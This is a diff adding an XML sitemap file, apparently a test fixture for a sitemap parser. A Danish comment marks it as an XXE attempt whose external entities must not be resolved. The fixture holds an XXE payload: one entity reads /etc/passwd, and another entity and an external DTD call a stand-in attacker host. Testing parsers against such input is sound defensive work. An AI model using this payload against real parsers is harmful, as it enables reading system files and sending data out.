@@ -1,0 +1,11 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!-- XXE-forsøg: ekstern entitet og ekstern DTD må hverken læses eller hentes. -->
+<!DOCTYPE urlset SYSTEM "http://angriber.invalid/sitemap.dtd" [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+  <!ENTITY net SYSTEM "http://angriber.invalid/hemmelig">
+]>
+<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">
+  <url><loc>&xxe;</loc><lastmod>2026-10-07</lastmod></url>
+  <url><loc>https://www.kilde.dk/nyheder/&net;</loc><lastmod>2026-10-07</lastmod></url>
+  <url><loc>https://www.kilde.dk/nyheder/ny-genbrugsplads-aabner</loc><lastmod>2026-10-07</lastmod></url>
+</urlset>
